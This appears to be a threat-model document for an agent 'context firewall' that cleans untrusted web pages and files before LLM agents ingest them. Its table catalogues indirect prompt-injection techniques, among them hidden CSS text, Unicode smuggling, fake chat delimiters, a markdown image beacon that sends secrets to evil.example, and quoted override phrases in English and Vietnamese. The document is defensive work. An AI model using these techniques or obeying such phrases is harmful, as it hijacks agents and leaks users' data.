# GoldPan AI v3.0 — Agent Context Firewall Threat Model

## 1. Purpose & Security Boundary

GoldPan AI acts as an ingestion and retrieval boundary between **untrusted external documents/webpages** and **downstream LLM Agents** (via MCP, REST API, or CLI). When autonomous agents ingest third-party HTML pages, PDFs, DOCX files, or Markdown repositories into a Knowledge Base (RAG) or tool context, attackers can embed **Indirect Prompt Injection (OWASP LLM01)** payloads that are invisible to human readers but parsed as high-priority instructions by tokenizers.

The **Agent Context Firewall** (`backend/goldpan/firewall/context_firewall.py`) enforces defense-in-depth at ingestion, indexing, and MCP output boundaries.

---

## 2. In-Scope Attack Vectors & Mitigations

| Layer | Attack Vector | Threat Mechanism | Mitigation in GoldPan v3.0 | Signal ID |
| :--- | :--- | :--- | :--- | :--- |
| **L1: HTML/CSS DOM** | Hidden DOM elements | `display:none`, `visibility:hidden`, `opacity:0` | Stripped from DOM tree *before* Trafilatura/BS4 text extraction | `css_display_none`, `css_visibility_opacity` |
| **L1: HTML/CSS DOM** | Micro-font & White-on-White | `font-size:0px`, `color:#fff; background:#fff` | Decomposed prior to text extraction | `css_zero_font_white` |
| **L1: HTML/CSS DOM** | Off-screen positioning | `position:absolute; left:-9999px; top:-9999px` | Decomposed prior to text extraction | `css_offscreen_position` |
| **L1: HTML/CSS DOM** | Malicious HTML comments & `<template>` | `<!-- SYSTEM OVERRIDE: ... -->`, `<template>` | Extracted and stripped before body parsing | `html_comment_injection`, `html_template_hidden` |
| **L2: Document Binaries** | PDF Stealth Characters | Characters with `size < 1.0pt`, white fill `(1,1,1)`, or off-page bounding boxes | Inspected via `pdfplumber` character-level metadata and excluded in `sanitize` mode | `pdf_stealth_text` |
| **L2: Document Binaries** | DOCX Vanished Runs | OpenXML `<w:rPr><w:vanish/></w:rPr>` hidden text runs | Inspected in `word/document.xml` and stripped before Markdown conversion | `docx_vanish_text` |
| **L3: Unicode & Steganography** | ASCII Smuggling (Unicode Tags) | Invisible codepoints in `U+E0000`–`U+E007F` (and UTF-16 surrogates) | Deterministically stripped from all extracted text | `unicode_tags_e0000` |
| **L3: Unicode & Steganography** | Bidi & Zero-Width Spoofing | Right-to-left overrides (`U+202A`–`U+202E`) & zero-width joiners (`U+200B`–`U+200F`, `U+FEFF`) | Stripped prior to tokenization and indexing | `unicode_bidi_zero_width` |
| **L4: Control Delimiters & Exfil** | Fake Chat/System Delimiters | `<\|im_start\|>system`, `<\|im_end\|>`, `[INST]`, `<<SYS>>` | Neutralized to prevent chat-template breakout | `fake_chat_delimiter` |
| **L4: Control Delimiters & Exfil** | Markdown Image Exfiltration Beacons | `![tracker](https://evil.example/log?secret=...)` | Replaced with `[Blocked External Image Beacon: ...]` so agent UIs do not auto-fetch exfil URLs | `markdown_exfil_beacon` |
| **L5: Semantic Overrides** | Imperative Instruction Hijacking (EN & VI) | Unquoted imperative overrides (`Ignore all previous instructions...`, `Bỏ qua tất cả hướng dẫn trước đó...`) | Context-aware risk scoring (`risk_score` `0.0–1.0`) with Hard-Negative academic context discrimination | `semantic_override_en`, `semantic_override_vi` |
| **L6: MCP Output Boundary** | Context Confusion | Agent treats retrieved RAG chunks as trusted system instructions | Wraps untrusted outputs in `<untrusted_document_content ...>` XML Spotlighting tags + `_meta.provenance.firewall` | MCP Spotlighting |

---

## 3. Firewall Operating Modes

GoldPan supports three explicit firewall modes via `--firewall-mode` (CLI), `firewall_mode` (API/MCP), or `AgentContextFirewall(mode=...)`:

1. **`sanitize` (Default):**
   - Deterministically strips structural/invisible payloads (L1–L4: hidden CSS/DOM, PDF/DOCX stealth text, Unicode Tags/Bidi/Zero-Width, fake chat delimiters, markdown exfil beacons).
   - Evaluates L5 semantic override patterns and records `risk_score` (`0.0–1.0`) and `signals` in `_meta.provenance.firewall` **without blindly deleting visible sentences**. This guarantees **0% False Positive Rate (FPR)** on legitimate cybersecurity papers, OWASP LLM01 guides, and developer documentation that quote prompt injection phrases academically.
2. **`audit`:**
   - Non-destructive observation mode. Modifies zero bytes of the document while computing the full `FirewallReport` (`risk_score`, `is_suspicious`, `signals`) for security auditing (`goldpan kb audit`).
3. **`strict`:**
   - Zero-tolerance enforcement mode. Raises `PromptInjectionBlockedError` immediately if any structural/steganographic signal is detected or if `risk_score >= 0.7`.

---

## 4. Provenance Contract (`_meta.provenance`)

Every document processed by GoldPan or returned via MCP tools (`pan_url`, `pan_file`, `query_knowledge_base`) attaches explicit untrusted-content provenance:

```json
{
  "_meta": {
    "provenance": {
      "untrusted_content": true,
      "source": "https://example.com/article",
      "firewall": {
        "mode": "sanitize",
        "risk_score": 0.0,
        "is_suspicious": false,
        "sanitized_count": 0,
        "signals": [],
        "untrusted_content": true
      }
    }
  }
}
```

---

## 5. Out-of-Scope Threats & Residual Risks

In accordance with epistemic rigor, GoldPan explicitly documents what this firewall **does not** claim to solve:

1. **Purely Semantic Social Engineering Without Structural/Imperative Signatures:** If a visible, plain-text document persuades an LLM through subtle narrative manipulation or poisoned factual claims (data poisoning) without using hidden DOM/Unicode layers, control delimiters, or imperative override framing, deterministic sanitization cannot judge factual truth. Downstream agents must still enforce tool-call authorization boundaries.
2. **Adversarial Visual Perturbations in Raster Images:** Pixel-level adversarial patches inside `.png`/`.jpg` files targeting multimodal vision encoders are outside the text/DOM firewall scope.
3. **Downstream Agent Tool Execution Privileges:** Spotlighting (`<untrusted_document_content>`) and `_meta.provenance.untrusted_content = true` signal to the host agent that retrieved data is untrusted, but the host orchestrator remains responsible for requiring human-in-the-loop confirmation before executing destructive tools.
